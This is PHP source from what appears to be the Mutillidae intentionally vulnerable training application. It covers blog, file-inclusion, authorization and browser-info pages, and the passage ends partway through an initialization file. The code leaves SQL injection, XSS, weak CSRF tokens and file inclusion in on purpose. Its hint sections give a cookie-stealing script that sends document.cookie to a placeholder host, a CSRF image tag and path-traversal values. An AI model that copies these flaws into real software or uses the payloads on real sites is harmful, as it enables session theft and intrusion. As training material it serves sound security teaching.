<?php
	/* Known Vulnerabilities: 
		SQL injection, 
		Cross Site Scripting, 
		Cross Site Request Forgery,
		Application Exception Output,
		Known Vulnerable Output: Name, Comment, "Add blog for" title,
		HTML injection
	*/
	/* Defined our constants to use to tokenize allowed HTML characters */
	include_once './includes/constants.php';

	if (!isSet($logged_in_user)) {
		throw new Exception("$logged_in_user is not set. Page add-to-your-blog.php requires this variable.");
	}// end if
	
	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   			// DO NOTHING: This is insecure		
			$lEncodeOutput = FALSE;
			$lLoggedInUser = $logged_in_user;
			$lTokenizeAllowedMarkup = FALSE;
			$lProtectAgainstSQLInjection = FALSE;
			$lProtectAgainstCSRF = FALSE;
			$lCSRFTokenStrength = "NONE";
			$lNewCSRFTokenForNextRequest = "SecurityIsDisabled";
			$lEnableJavaScriptValidation = FALSE;
		break;	   		

   		case "1": // This code is insecure
   			// DO NOTHING: This is insecure		
			$lEncodeOutput = FALSE;
			$lLoggedInUser = $logged_in_user;
			$lTokenizeAllowedMarkup = FALSE;
			$lProtectAgainstSQLInjection = FALSE;
			$lProtectAgainstCSRF = TRUE;
			$lCSRFTokenStrength = "LOW";
			$lNewCSRFTokenForNextRequest = "SecurityIsDisabled";
			$lEnableJavaScriptValidation = TRUE;			
		break;	   		

		case "2":
		case "3":
		case "4":
		case "5": // This code is fairly secure
  			/* 
  			 * NOTE: Input validation is excellent but not enough. The output must be
  			 * encoded per context. For example, if output is placed in HTML,
  			 * then HTML encode it. Blacklisting is a losing proposition. You 
  			 * cannot blacklist everything. The business requirements will usually
  			 * require allowing dangerous charaters. In the example here, we can 
  			 * validate username but we have to allow special characters in passwords
  			 * least we force weak passwords. We cannot validate the signature hardly 
  			 * at all. The business requirements for text fields will demand most
  			 * characters. Output encoding is the answer. Validate what you can, encode it
  			 * all.
  			 */
   			// encode the output following OWASP standards
   			// this will be HTML encoding because we are outputting data into HTML
			$lEncodeOutput = TRUE;
			
			/* Business Problem: Sometimes the business requirements define that users
			 * should be allowed to use some HTML  markup. If unneccesary, this is a
			 * bad idea. Output encoding will naturally kill any users attempt to use HTML
			 * in their input, which is exactly why we use output encoding. 
			 * 
			 * If the business process allows some HTML, then those HTML items are elevated
			 * from "mallicious input" to "direct object refernces" (a resource to be enjoyed).
			 * When we want to restrict a user to using to "direct object refernces" (a 
			 * resource to be enjoyed) responsibly, we use mapping. Mapping allows the user
			 * to chose from a "system generated" (that's us programmers) set of tokens
			 * to pick from. We need to assure that the user either chooses one of the tokens
			 * we offer, or our system rejects the request. To put it bluntly, either the user
			 * follows the rules, or their output is encoded. Period.
			 */
			$lTokenizeAllowedMarkup = TRUE;
			
			/* If we are in secure mode, we need to protect against SQLi */
			$lProtectAgainstSQLInjection = TRUE;

			/* Protecting against CSRF requires that we allow the server to know
			 * if the user intended to submit the request. For example, this page
			 * adds a blog entry. How does the server know that the current user
			 * intended to add a blog entry? Perhaps an agent caused the users
			 * browser to POST an "add" request without th$_SESSION['add-to-your-blog']['csrf-token']e users consent. CAPTCHA
			 * can help as can randomly generated math problems. Another method is 
			 * to have the server attach random tokens to forms, then verify the 
			 * token is returned upon submition. 
			 */
			$lProtectAgainstCSRF = TRUE;
			$lCSRFTokenStrength = "HIGH";
			
			/* Note that $conn->real_escape_string is ok but not the best defense. Stored
			 * Procedures are a much more powerful defense, run much faster, can be
			 * trapped in a schema, can run on the database, and can be called from
			 * any number of web applications. Stored procs are the true anti-pwn.
			 * There are 3 ways that stored procs can be made vulenrable by developers,
			 * but they are safe by default. Queries are vulnerable by default.
			 */
			$lLoggedInUser = $conn->real_escape_string($logged_in_user);
			
			/* 
			 * There is no security in JS validation. You must validate on the server.
			 * JS is easy to bypass.
			 */
			$lEnableJavaScriptValidation = TRUE;
   		break;
   	}// end switch
   	
   	if($lProtectAgainstCSRF){
			/* Record the CSRF token that we saved in the session when we offered the ADD BLOG 
			 * page to the user. This was the token we created before the user POSTed to this page
			 * a new blog entry to be saved.
			 */
			$lExpectedTokenForThisRequest = $_SESSION['add-to-your-blog']['csrf-token'];
   		
   			/* Store a new token in the session for the NEXT request to add a new blog entry.
			 * The user might be making a request right now, but this token is for the next
			 * request if it ever occurs.
			 */
			switch ($lCSRFTokenStrength){
				case "HIGH":
					$_SESSION['add-to-your-blog']['csrf-token'] = $lNewCSRFTokenForNextRequest = $ESAPIRandomizer->getRandomString(32, "ABCDEFGEHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890");
				break;
				case "MEDIUM":
					$_SESSION['add-to-your-blog']['csrf-token'] = $lNewCSRFTokenForNextRequest = mt_rand();
				break;
				case "LOW":
					if (!is_null($lExpectedTokenForThisRequest)) {
						$_SESSION['add-to-your-blog']['csrf-token'] = $lNewCSRFTokenForNextRequest = ($lExpectedTokenForThisRequest + 7777);
					}else{
						//initialize the tokens
						$_SESSION['add-to-your-blog']['csrf-token'] = $lNewCSRFTokenForNextRequest = 5323;
					}//end if
				break;
				default:break;
			}//end switch on $lCSRFTokenStrength

			/* Record the token which the user just passed in. If they used the page offered, the token
			 * should match. If the users browser was forced to make a request, the token sent should
			 * not match unless the attacker makes a good guess.
			 */
			$lPostedCSRFToken = $_POST['csrf-token'];
   	}// end if $lProtectAgainstCSRF

	/* ----------------------------------------
	 * Insert user's new blog entry 
	 * ----------------------------------------
	 * precondition: $logged_in_user is not null 
	 */
	if(isSet($_POST["add-to-your-blog-php-submit-button"])){
		try {
			if ($lProtectAgainstCSRF){
				if ($lPostedCSRFToken != $lExpectedTokenForThisRequest){
					throw (new Exception("Security Violation: Cross Site Request Forgery attempt detected.", 500));
				}// end if
			}// end if
			
			// Grab inputs
			if ($lProtectAgainstSQLInjection){
				// This might prevent SQL injection on the insert.
				$lBlogEntry = $conn->real_escape_string($_POST["blog_entry"]);
			}else{
				$lBlogEntry = $_REQUEST["blog_entry"];
			}// end if

			/* Some dangerous markup allowed. Here we tokenize it for storage. */
			if ($lTokenizeAllowedMarkup){
				$lBlogEntry = str_ireplace('<b>', BOLD_STARTING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('</b>', BOLD_ENDING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('<i>', ITALIC_STARTING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('</i>', ITALIC_ENDING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('<u>', UNDERLINE_STARTING_TAG, $lBlogEntry);
				$lBlogEntry = str_ireplace('</u>', UNDERLINE_ENDING_TAG, $lBlogEntry);				
			}// end if $lTokenizeAllowedMarkup			
			
			// weak server-side input validation. not good enough.
			if(strlen($lBlogEntry) > 0){
				$lValidationFailed = FALSE;
				
				$query = "INSERT INTO blogs_table(blogger_name, comment, date) VALUES ('".
					$lLoggedInUser . "', '".
					$lBlogEntry  . "', " .
					" now() )";
					
				//	$query = "CALL insertBlogEntry('".$logged_in_user."', '".$lBlogEntry."');";
		
				$result = $conn->query($query);
				if (!$result) {
			    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
			    }// end if
				
				$LogHandler->writeToLog($conn, "Blog entry added by: " . $lLoggedInUser);
				
			}else{
				$lValidationFailed = TRUE;
			}// end if(strlen($lBlogEntry) > 0)
		} catch (Exception $e) {
			echo $CustomErrorHandler->FormatError($e, "Error: ".$conn->error." Query: ".$query);
		}// end try
	}else {
		$lValidationFailed = FALSE;
	}// end if isSet($_POST["add-to-your-blog-php-submit-button"])
?>

<!-- BEGIN HTML OUTPUT  -->
<script type="text/javascript">
	var onSubmitBlogEntry = function(/* HTMLForm */ theForm){

		<?php 
			if($lEnableJavaScriptValidation){
				echo "var lInvalidBlogPattern = /\'/;";
			}else{
				echo "var lInvalidBlogPattern = /*/;";
			}// end if
		?>
		
		if(theForm.blog_entry.value.search(lInvalidBlogPattern) > -1){
			alert('Single-quotes are not allowed. Dont listen to security people. Everyone knows if we just filter dangerous characters, XSS is not possible.\n\nWe use JavaScript defenses combined with filtering technology.\n\nBoth are such great defenses that you are stopped in your tracks.');
			return false;
		}
	};// end JavaScript function onSubmitBlogEntry()
</script>
<div class="page-title">Welcome To The Blog</div>

<?php include_once './includes/back-button.inc';?>

<fieldset>
	<legend>Add New Blog Entry</legend>
	<form 	action="index.php?page=add-to-your-blog.php" 
			method="post" 
			enctype="application/x-www-form-urlencoded" 
			onsubmit="return onSubmitBlogEntry(this);"
			id="idBlogForm">		
		<input name="csrf-token" type="hidden" value="<?php echo $lNewCSRFTokenForNextRequest; ?>" />
		<span>
			<a href="http://localhost/mutillidae/index.php?page=view-someones-blog.php">
			<img style="vertical-align: middle;" src="./images/magnifying-glass-icon.jpeg" height="32px" width="32px" />
			<span style="font-weight:bold; text-decoration: none;">View Blogs</span>
			</a>
		</span>
		<table style="margin-left:auto; margin-right:auto;">
			<tr id="id-bad-blog-entry-tr" style="display: none;">
				<td class="error-message">
					Validation Error: Blog entry cannot be blank
				</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td id="id-blog-form-header-td" class="form-header">Add blog for <?php echo $lLoggedInUser?></td>
			</tr>
			<tr><td></td></tr>
			<tr><td class="report-header">Note: &lt;b&gt;,&lt;/b&gt;,&lt;i&gt;,&lt;/i&gt;,&lt;u&gt; and &lt;/u&gt; are now allowed in blog entries</td></tr>
			<tr>
				<td><textarea rows="10" cols="65" name="blog_entry"></textarea></td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td style="text-align:center;">
					<input name="add-to-your-blog-php-submit-button" class="button" type="submit" value="Save Blog Entry" />
				</td>
			</tr>
			<tr><td></td></tr>
		</table>
	</form>
</fieldset>

<?php
	if ($lValidationFailed) {
		echo '<script>document.getElementById("id-bad-blog-entry-tr").style.display="";</script>'; 
	}// end if ($lValidationFailed)
?>

<?php
	/* Display current user's blog entries */
	try {
		/* Note that the logged in user could be used for SQL injection */
		$query  = "SELECT * FROM blogs_table WHERE
				blogger_name like '{$lLoggedInUser}%'
				ORDER BY date DESC
				LIMIT 0 , 100";
				
		$result = $conn->query($query);
		if (!$result) {
	    	throw (new Exception('Error: '.$conn->error, $conn->errorno));
	    }// end if
				
		echo '<div>&nbsp;</div>
				<span>
					<a href="http://localhost/mutillidae/index.php?page=view-someones-blog.php">
					<img style="vertical-align: middle;" src="./images/magnifying-glass-icon.jpeg" height="32px" width="32px" />
					<span style="font-weight:bold; text-decoration: none;">View Blogs</span>
					</a>
				</span>';
		echo '<table border="1px" width="90%" class="main-table-frame">';
	    echo ' 	<tr class="report-header">
		    		<td colspan="4">'.$result->num_rows.' Current Blog Entries</td>
		    	</tr>
		    	<tr class="report-header">
		    		<td>&nbsp;</td>
				    <td>Name</td>
				    <td>Date</td>
				    <td>Comment</td>
			    </tr>';

	    $lRowNumber = 0;
	    while($row = $result->fetch_object()){
	    	
	    	$lRowNumber++;
	    	
			if(!$lEncodeOutput){
				$lBloggerName = $row->blogger_name;
				$lDate = $row->date;
				$lComment = $row->comment;
			}else{
				$lBloggerName = $Encoder->encodeForHTML($row->blogger_name);
				$lDate = $Encoder->encodeForHTML($row->date);
				$lComment = $Encoder->encodeForHTML($row->comment);
			}// end if

			/* Some dangerous markup allowed. Here we restore the tokenized output. 
			 * Note that using GUIDs as tokens works well because they are 
			 * fairly unique plus they encode to the same value. 
			 * Encoding wont hurt them.
			 * 
			 * Note: Mutillidae is weird. It has to be broken and unbroken at the same time.
			 * Here we un-tokenize our output no matter if we are in secure mode or not.
			 */
			$lComment = str_ireplace(BOLD_STARTING_TAG, '<span style="font-weight:bold;">', $lComment);
			$lComment = str_ireplace(BOLD_ENDING_TAG, '</span>', $lComment);
			$lComment = str_ireplace(ITALIC_STARTING_TAG, '<span style="font-style: italic;">', $lComment);
			$lComment = str_ireplace(ITALIC_ENDING_TAG, '</span>', $lComment);
			$lComment = str_ireplace(UNDERLINE_STARTING_TAG, '<span style="border-bottom: 1px solid #000000;">', $lComment);
			$lComment = str_ireplace(UNDERLINE_ENDING_TAG, '</span>', $lComment);

			echo "<tr>
					<td>{$lRowNumber}</td>
					<td>{$lBloggerName}</td>
					<td>{$lDate}</td>
					<td>{$lComment}</td>
				</tr>\n";
		}//end while $row
		echo "</table><div>&nbsp;</div>";		

	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
	}// end try	
?>

<?php 
if ($lProtectAgainstCSRF){
	echo('<div>&nbsp;</div>'.PHP_EOL);
	echo('<div>&nbsp;</div>'.PHP_EOL);
	echo('<fieldset>'.PHP_EOL);
	echo('<legend>CSRF Protection Information</legend>'.PHP_EOL);
	echo('<table style="margin-left:auto; margin-right:auto;">'.PHP_EOL);				
	echo('<tr><td></td></tr>'.PHP_EOL);
	echo('<tr><td class="report-header">Posted Token: '.$lPostedCSRFToken.'</td></tr>'.PHP_EOL);
	echo('<tr><td>Expected Token For This Request: '.$lExpectedTokenForThisRequest.'</td></tr>'.PHP_EOL);
	echo('<tr><td>Token Passed By User For This Request: '.$lPostedCSRFToken.'</td></tr>'.PHP_EOL);	
	echo('<tr><td>&nbsp;</td></tr>'.PHP_EOL);
	echo('<tr><td>New Token For Next Request: '.$lNewCSRFTokenForNextRequest.'</td></tr>'.PHP_EOL);
	echo('<tr><td>Token Stored in Session: '.$_SESSION['add-to-your-blog']['csrf-token'].'</td></tr>'.PHP_EOL);
	echo('<tr><td></td></tr>'.PHP_EOL);
	echo('</table>'.PHP_EOL);
	echo('</fieldset>'.PHP_EOL);
}// end if $lProtectAgainstCSRF
?>
<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table style="hint-table">
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For XSS:</b>XSS is easy stuff. This one shows off 
						  		both reflected (you see the results 
								instantly) and stored (someone can run across it 
								later in another app that uses the same database). 
								"&lt;script&gt;alert("XSS");&lt;/script&gt;" is the 
								classic, but there are far more interesting things you 
								could do which I plan show in a video later.
							</li>
						  	<li>For some hot cookie stealing action, try something like:
<code>
&lt;script&gt;
	new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
&lt;/script&gt;
</code>	
							</li>
							<li>Check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
								for more ways you can encode XSS attacks that may 
								allow you to get around some filters.
							</li>
							<li><b>For CSRF:</b>You can create another page someplace and
							make a link to an image that is not an image. You can also
							send someone an HTML email with a link inside. Sending links over
							HTML aware Instant Messaging like Communicator also works. One of the 
							quietest methods is to use HTML injection to poison a web page thus 
							creating a persistant attack. When a user visits the poisoned page, 
							their browser will reach out to the targe page. Using an AJAX request 
							can keep the rouge tranaction silent.
							You could use something like the following:
							<br>
							&lt;img src="http://localhost/mutillidae/index.php?page=add-to-your-blog.php&input_from_form=hi%20there%20monkeyboy"&gt;
							<br>
							This is the easy way to do CSRF with the GET method. Login 
							as someone, make your page with the link image someplace else, 
							and then view it. You should now see
							something new on the comment wall.
							</li>
							<li>
								For Cross Site Request Forgery, a tool like the Social
								Engineering Toolkit by Dave Kennedy can help. 
							</li>
							<li>
								One interesting concept is injecting server side code. Talk about ownage. This
								requires very special circumstances though. Essentially you need the concept of "eval()"
								happening on the server-side. In Oracle and SQL Server this command is "EXEC". In JavaScript
								the command is "eval()". In PHP and ASP look for "include()". In ColdFusion the <cfinclude> tag 
								fulfills this purpose.
								
								Eval() is the opposite of encoding. It takes a text context and transforms text into 
								an execution context. Encoding takes potetially dangerous code that could execute and
								renders it harmless.
							</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
		include_once './includes/cross-site-request-forgery-tutorial.inc';
	}// end if
?>

<script type="text/javascript">
	try{
		document.getElementById("idBlogForm").blog_entry.focus();
	}catch(e){
		alert('Error trying to set focus on field blog_entry: ' + e.message);
	}// end try
</script>
<?php 
	try{
		switch ($_SESSION["security-level"]){
	   		case "0": // This code is insecure
	   		case "1": // This code is insecure
	   			// DO NOTHING: This is insecure		
				$lEncodeOutput = FALSE;
			break;
		    		
			case "2":
			case "3":
			case "4":
	   		case "5": // This code is fairly secure
	  			/* 
	  			 * NOTE: Input validation is excellent but not enough. The output must be
	  			 * encoded per context. For example, if output is placed	 in HTML,
	  			 * then HTML encode it. Blacklisting is a losing proposition. You 
	  			 * cannot blacklist everything. The business requirements will usually
	  			 * require allowing dangerous charaters. In the example here, we can 
	  			 * validate username but we have to allow special characters in passwords
	  			 * least we force weak passwords. We cannot validate the signature hardly 
	  			 * at all. The business requirements for text fields will demand most
	  			 * characters. Output encoding is the answer. Validate what you can, encode it
	  			 * all.
	  			 * 
	  			 * For JavaScript, always output using innerText (IE) or textContent (FF),
	  			 * Do NOT use innerHTML. Using innerHTML is weak anyway. When 
	  			 * attempting DHTML, program with the proper interface which is
	  			 * the DOM. Thats what it is there for.
	  			 */
	   			// encode the output following OWASP standards
	   			// this will be HTML encoding because we are outputting data into HTML
				$lEncodeOutput = TRUE;
	   		break;
	   	}// end switch		
	
		if ($lEncodeOutput){
			$lPage = $Encoder->encodeForHTML($_GET['page']);
		}else{
			$lPage = $_REQUEST['page'];
		}// end if
	
    } catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
    }// end try;
?>

<div class="page-title">Arbitrary File Inclusion</div>

<?php include_once './includes/back-button.inc';?>

<table style="margin-left:auto; margin-right:auto;">
	<tr>
		<td colspan="2" class="form-header">Arbitrary File Inclusion</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td class="label">Current Page: </td>
		<td><?php echo $lPage; ?></td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td colspan="2" style="text-align:center;" class="label">
			Notice that the page displayed by Mutillidae is decided 
			by the value in the "page" variable.<br>
			The "page" variable is passed as a URL query parameter.  
		</td>
	</tr>
	<tr>
		<td colspan="2" style="text-align:center;" class="label">
			What could possibly go wrong? 
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
</table>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
							<li>
								Parameter pollution can occur for several reasons. One is that developers
								sometimes fetch values using the "REQUEST" array. This allows the user to inject
								variables into either GET or POST and have the application process them. To
								cause parameter pollusion, a user can send parameters via POST which the developer
								thinks should be passed via the URL. The user could also pass a variable using both
								GET and POST. The application can be tricked by the bogus parameters.
							</li>
							<li>
								Although not the intended theme of this page, it does display output
								based on user input. Could it be vulnerable to Cross Site Scripting?
							</li>
							<li>
								Arbitrary File Inclusion: The page displayed in Mutillidae is determined 
								by the value of the "page" parameter. What would happen the "page" 
								parameter was changed to a filename which is on the server but not
								intended to be served? This defect can be combined with other defects. 
								For example, the "page" parameter might be able to be passed in via either
								GET or POST due to the parameters pollutition flaw. Using the parent
								traversal operator ("..") can help break out of the web server file
								folders. Also, direct file paths can be tried. For example, if Mutillidae
								is running on a Windows XP system, the following values for "page" 
								can be tried.
								<ul>
									<li>C:\boot.ini</li>
									<li>..\..\..\..\boot.ini</li>
								<ul>
							</li>
				  		</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
?>
<div class="page-title">Authorization Required</div>

<?php include_once './includes/back-button.inc';?>

<table style="margin-left:auto; margin-right:auto;">
	<tr>
		<td class="error-message">
			Authorization Error: 403 - Page Requires Higher Privileges Than Current User Possesses
		</td>
	</tr>
</table><?php 

	try{
		switch ($_SESSION["security-level"]){
	   		case "0": // This code is insecure
	   		case "1": // This code is insecure
	   			// DO NOTHING: This is insecure		
				$lEncodeOutput = FALSE;
				$luseSafeJavaScript = "false";
			break;

			case "2":
			case "3":
			case "4":
	   		case "5": // This code is fairly secure
	  			/* 
	  			 * NOTE: Input validation is excellent but not enough. The output must be
	  			 * encoded per context. For example, if output is placed	 in HTML,
	  			 * then HTML encode it. Blacklisting is a losing proposition. You 
	  			 * cannot blacklist everything. The business requirements will usually
	  			 * require allowing dangerous charaters. In the example here, we can 
	  			 * validate username but we have to allow special characters in passwords
	  			 * least we force weak passwords. We cannot validate the signature hardly 
	  			 * at all. The business requirements for text fields will demand most
	  			 * characters. Output encoding is the answer. Validate what you can, encode it
	  			 * all.
	  			 * 
	  			 * For JavaScript, always output using innerText (IE) or textContent (FF),
	  			 * Do NOT use innerHTML. Using innerHTML is weak anyway. When 
	  			 * attempting DHTML, program with the proper interface which is
	  			 * the DOM. Thats what it is there for.
	  			 */
	   			// encode the output following OWASP standards
	   			// this will be HTML encoding because we are outputting data into HTML
				$lEncodeOutput = TRUE;
				$luseSafeJavaScript = "true";
	   		break;
	   	}// end switch		
	
		require_once 'classes/ClientInformationHandler.php';
		$lClientInformationHandler = new ClientInformationHandler();
		
		if ($lEncodeOutput){
			$lWhoIsInformation = $Encoder->encodeForHTML($lClientInformationHandler->whoIsClient());
			$lOperatingSystem = $Encoder->encodeForHTML($lClientInformationHandler->getOperatingSystem());
			$lBrowser = $Encoder->encodeForHTML($lClientInformationHandler->getBrowser());
			$lClientHostname = $Encoder->encodeForHTML($lClientInformationHandler->getClientHostname());
			$lClientIP = $Encoder->encodeForHTML($lClientInformationHandler->getClientIP());
			$lClientUserAgentString = $Encoder->encodeForHTML($lClientInformationHandler->getClientUserAgentString());
			$lClientReferrer = $Encoder->encodeForHTML($lClientInformationHandler->getClientReferrer());
			$lClientPort = $Encoder->encodeForHTML($lClientInformationHandler->getClientPort());
		}else{
			$lWhoIsInformation = $lClientInformationHandler->whoIsClient();
			$lOperatingSystem = $lClientInformationHandler->getOperatingSystem();
			$lBrowser = $lClientInformationHandler->getBrowser();
			$lClientHostname = $lClientInformationHandler->getClientHostname();
			$lClientIP = $lClientInformationHandler->getClientIP();
			$lClientUserAgentString = $lClientInformationHandler->getClientUserAgentString();
			$lClientReferrer = $lClientInformationHandler->getClientReferrer();
			$lClientPort = $lClientInformationHandler->getClientPort();
		}// end if
	
    } catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
    }// end try;
?>

<div class="page-title">Browser Information</div>

<?php include_once './includes/back-button.inc';?>

<table border="1px" width="75%" class="main-table-frame">
	<tr class="report-header"><td colspan="3">Info obtained by PHP</td></tr>
	<tr><td class="non-wrapping-label">Client IP</td><td><?php echo $lClientIP; ?></td></tr>
    <tr><td class="non-wrapping-label">Client Hostname</td><td><?php echo $lClientHostname; ?></td></tr>
    <tr><td class="non-wrapping-label">Operating System</td><td><?php echo $lOperatingSystem ?></td></tr>
    <tr><td class="non-wrapping-label">User Agent String</td><td><?php echo $lClientUserAgentString; ?></td></tr>
    <tr><td class="non-wrapping-label">Referrer</td><td><?php echo $lClientReferrer; ?></td></tr>
    <tr><td class="non-wrapping-label">Remote Client Port</td><td><?php echo $lClientPort; ?></td></tr>
    <tr><td class="non-wrapping-label">WhoIs info for client IP</td><td><pre><?php echo $lWhoIsInformation; ?></pre></td></tr>
	<?php 
	if ($lEncodeOutput){	
		foreach ($_COOKIE as $key => $value){
	    	echo '<tr><td class="non-wrapping-label">Cookie '.$Encoder->encodeForHTML($key).'</td><td>'.$Encoder->encodeForHTML($value).'</pre></td></tr>';
		}// end foreach
	}else{
		foreach ($_COOKIE as $key => $value){
	    	echo '<tr><td class="non-wrapping-label">Cookie '.$key.'</td><td>'.$value.'</pre></td></tr>';
		}// end foreach
	}// end if
	?>    
</table>
<div>&nbsp;</div><div>&nbsp;</div>
<table border="1px" width="75%" class="main-table-frame">
    <tr class="report-header"><td colspan="3">Info obtained by JavaScript</td></tr>
	<tr>
		<td class="non-wrapping-label">Browser Name</td>
		<td id="id_browser_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Browser Codename</td>
		<td id="id_browser_codename_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Browser Version</td>
		<td id="id_browser_version_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Cookie Enabled?</td>
		<td id="id_cookie_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Platform</td>
		<td id="id_platform_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">User Agent</td>
		<td id="id_user_agent_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">CPU Class</td>
		<td id="id_java_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">System Language</td>
		<td id="id_system_language_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Resolution</td>
		<td id="id_resolution_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Color Depth</td>
		<td id="id_color_depth_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Referrer</td>
		<td id="id_referrer_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Plug-Ins</td>
		<td id="id_plug_ins_td"></td>
	</tr>
</table>

<script type="text/javascript">

	var g_beSmart = <?php echo $luseSafeJavaScript; ?>;
	var g_usingIE = ('all' in document);

	var outputValue = function(p_elementId, p_elementValue, p_beSmart, p_usingIE){
		if(p_beSmart){
			//safe
			if(p_usingIE){
				document.getElementById(p_elementId).innerText = p_elementValue;
			}else{
				document.getElementById(p_elementId).textContent = p_elementValue;
			}// end if
		}else{
			// unsafe and low-skill - should be using DOM interface
			document.getElementById(p_elementId).innerHTML = p_elementValue;
		}//end if
	}// end function

	outputValue("id_browser_td", navigator.appName, g_beSmart, g_usingIE);
	outputValue("id_browser_codename_td", navigator.appCodeName, g_beSmart, g_usingIE);
	outputValue("id_browser_version_td", navigator.appVersion, g_beSmart, g_usingIE);
	outputValue("id_cookie_enabled_td", navigator.cookieEnabled, g_beSmart, g_usingIE);
	outputValue("id_platform_td", navigator.platform, g_beSmart, g_usingIE);
	outputValue("id_user_agent_td", navigator.userAgent, g_beSmart, g_usingIE);
	outputValue("id_cpu_class_td", navigator.cpuClass, g_beSmart, g_usingIE);
	outputValue("id_java_enabled_td", navigator.javaEnabled, g_beSmart, g_usingIE);
	outputValue("id_system_language_enabled_td", navigator.systemLanguage, g_beSmart, g_usingIE);
	outputValue("id_resolution_enabled_td", screen.width+"x"+screen.height, g_beSmart, g_usingIE);
	outputValue("id_color_depth_enabled_td", screen.colorDepth, g_beSmart, g_usingIE);
	outputValue("id_referrer_td", document.referrer, g_beSmart, g_usingIE);

	if (navigator.appName=="Netscape"){
		for (i in navigator.plugins){
			l_plugins =+ navigator.plugins[i].name.toString() + ';';
		}// end for
		outputValue("id_plug_ins_td", l_plugins, g_beSmart, g_usingIE);
	}// end if
</script>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For XSS:</b>XSS is easy stuff. This one shows off 
						  		both reflected (you see the results 
								instantly) and stored (someone can run across it 
								later in another app that uses the same database). 
								"&lt;script&gt;alert("XSS");&lt;/script&gt;" is the 
								classic, but there are far more interesting things you 
								could do which I plan show in a video later.
							</li>
						  	<li>For some hot cookie stealing action, try something like:
								<pre>
								&lt;script&gt;
									new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
								&lt;/script&gt;
								</pre>	
							</li>
							<li>Check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
								for more ways you can encode XSS attacks that may 
								allow you to get around some filters.
							</li>
							<li><b>For CSRF:</b>You can create another page someplace and
							make a link to an image that is not an image. You can also
							send someone an HTML email with a link inside. Sending links over
							HTML aware Instant Messaging like Communicator also works. One of the 
							quietest methods is to use HTML injection to poison a web page thus 
							creating a persistant attack. When a user visits the poisoned page, 
							their browser will reach out to the targe page. Using an AJAX request 
							can keep the rouge tranaction silent.
							You could use something like the following:
							<br>
							&lt;img src="http://localhost/mutillidae/index.php?page=add-to-your-blog.php&input_from_form=hi%20there%20monkeyboy"&gt;
							<br>
							This is the easy way to do CSRF with the GET method. Login 
							as someone, make your page with the link image someplace else, 
							and then view it. You should now see
							something new on the comment wall.
							</li>
							<li>
								For Cross Site Request Forgery, a tool like the Social
								Engineering Toolkit by Dave Kennedy can help. 
							</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?><?php
	 /* Known Vulnerabilities
	 * 
	 * SQL Injection, (Fix: Use Schematized Stored Procedures)
	 * Cross Site Scripting, (Fix: Encode all output)
	 * Cross Site Request Forgery, (Fix: Tokenize transactions)
	 * Denial of Service, (Fix: Truncate Log Queries)
	 * Improper Error Handling, (Fix: Employ custom error handler)
	 * SQL Exception, (Fix: Employ custom error handler)
	 */

	/* ------------------------------------------
	 * Constants used in application
	 * ------------------------------------------ */
	include_once './includes/constants.php';

    /* ------------------------------------------
     * INITIALIZE DATABASE
     * ------------------------------------------ */
    require_once 'config.inc';
    require_once 'opendb.inc';

	/* ------------------------------------------
	 * initialize OWASP ESAPI for PHP
	 * ------------------------------------------ */
    require_once 'owasp-esapi-php/src/ESAPI.php';
	if (!isset($ESAPI)){
		$ESAPI = new ESAPI('owasp-esapi-php/src/ESAPI.xml');
		$Encoder = $ESAPI->getEncoder();
	}// end if
	
	/* ------------------------------------------
	 * initialize custom error handler
	 * ------------------------------------------ */
    require_once 'classes/CustomErrorHandler.php';
	if (!isset($CustomErrorHandler)){
		$CustomErrorHandler = 
		new CustomErrorHandler("owasp-esapi-php/src/", $_SESSION["security-level"]);
